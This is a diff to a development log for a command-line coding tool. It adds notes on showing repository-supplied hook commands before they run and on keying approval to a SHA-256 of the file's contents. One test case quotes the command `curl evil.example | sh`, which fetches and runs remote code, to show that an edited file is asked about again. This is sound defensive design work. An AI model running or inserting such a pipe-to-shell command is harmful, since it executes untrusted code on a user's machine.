@@ -214,6 +214,7 @@ Delivery order for this gate, each as its own TDD checkpoint after L0.8:
 - [x] **E13.4 subagent auto-deny** — orchestrated work never prompts; anything its tier would ask about is refused with the way to allow it.
 - [x] **E13.5 readable output** — binaries are described rather than sent, and a large file says how to page through the rest.
 - [x] **E13.6 permission rules with scopes** — `allow bash(git *)` and friends, last match wins, kept for this session, this project, or everywhere.
+- [x] **G16.3 project hooks are shown before they run** — every command listed together, approval keyed by content so an edit cannot inherit an old yes.
 - [x] **G16.2 hook events and the confirmation** — a hook is a shell command somebody agreed to once, bounded, scrubbed, and unable to fail the edit it followed.
 - [x] **G16.1 markdown commands** — a file in a directory becomes a slash command, and it cannot become one that already exists.
 - [x] **G16.4 `mcp(...)` permission rules** — a server's tools become governable by prefix, and the widest rule stops quietly excluding them.
@@ -2135,6 +2136,68 @@ Acceptance checklist:
 - [x] hand-written chapters still work with no planner, reporting no-work.
 - [x] DONE in any casing ends the saga; a multi-line title is cut to one line.
 - [x] full `make check` green: 2,056 tests, 0 lint issues.
+
+### G16.3 built — project hooks are shown first, and the last named leaf closes
+
+*A `.kolk/hooks.json` in a cloned repository is a shell command a stranger wrote.* The leaf is one
+sentence of policy and three decisions that only appear when you build it.
+
+**"Shown" means all of them, together, before any of them runs.** Listing each command as its event
+fired would let a repository hide the fifth behind four boring ones, and the person approving would
+be answering a different question each time without knowing how many were left. The prompt also says
+whose commands these are — *"shell commands from this repository, not from you"* — because the
+distinction is the entire reason for asking.
+
+**Approval is keyed by the file's contents, not its path.** This is the decision worth the leaf. A
+remembered "yes" attached to a directory would let a repository approve something harmless and edit
+it afterwards: the approval outlives the thing it was given for, which is a supply-chain move with
+a friendly face. A SHA-256 of the file means an edit re-asks — tested by approving one file, editing
+it to `curl evil.example | sh`, and asserting the second is refused and asked about separately.
+
+**Session-scoped, and persistence refused in writing rather than deferred vaguely.** A remembered yes
+that survives restarts is a thing a repository can farm. Persisting one safely would need a store the
+project cannot influence and an expiry nobody has yet wanted. If being asked once per session becomes
+the friction that stops people reading the list, *that* is the moment to add it — and the list being
+read is the whole point.
+
+**Defaults are no, everywhere.** An empty answer, an unreadable prompt, and no one at the terminal
+all mean no; declining says plainly that the user's own hooks still work, so refusing costs nothing
+someone already had.
+
+**Where this differs from G16.1, and why.** Markdown commands are a *lookup*: the nearer file wins a
+name and the other is never seen. Hooks are *actions*, so both run and the user's go first — there is
+no reason a project's formatter should silence a notification someone configured for themselves.
+Nearer does not mean instead-of when nothing is being named. The shape was reused where it fit and
+deliberately not where it did not.
+
+With this, **every named build leaf in PLAN.md is done.**
+
+### Every named build leaf is closed — what genuinely remains
+
+Audited against `CHECKPOINTS.md` and `PLAN.md` rather than assumed:
+
+- **T0.5 clean-machine rehearsal** — install, first run, key, first model response on a machine with
+  no Go toolchain and no prior Kolkrabbi files. It cannot honestly be closed from the machine that
+  built all this; it is owner work on a clean one.
+- **B12.13** (a subscription-only OpenRouter key) and **L13.5b4** (pinning a managed runtime release
+  with its checksum) — both parked on the owner since before this session, both unchanged.
+- **Phase A's failure-path tests** — recorded as open in the phase table, never picked up.
+- **Phase E's OS sandbox matrix** — deferred deliberately, still deferred.
+- **Item 16's own open questions** — mode/effort in a command's front matter (left out of v1), and
+  MCP transports, which stay deferred behind the two blockers the item names. G16.4 closed the
+  permission half of the first blocker; the schema half is measured (G16.5) and the bridge is not
+  built.
+
+Nothing else in the plan is waiting on work I can do without a decision from the owner.
+
+Acceptance checklist:
+
+- [x] eleven tests written first across two packages, including the edited-file case.
+- [x] approval keyed by content, so it cannot be inherited by a different file.
+- [x] persistence refused with its reasoning, not deferred without one.
+- [x] every default proven to be no, including nobody at the prompt.
+- [x] the difference from G16.1's precedence explained rather than copied blindly.
+- [x] full `make check` green: 2,298 tests, 0 lint issues.
 
 ### G16.2 built — hook events, and the confirmation that is the point
 
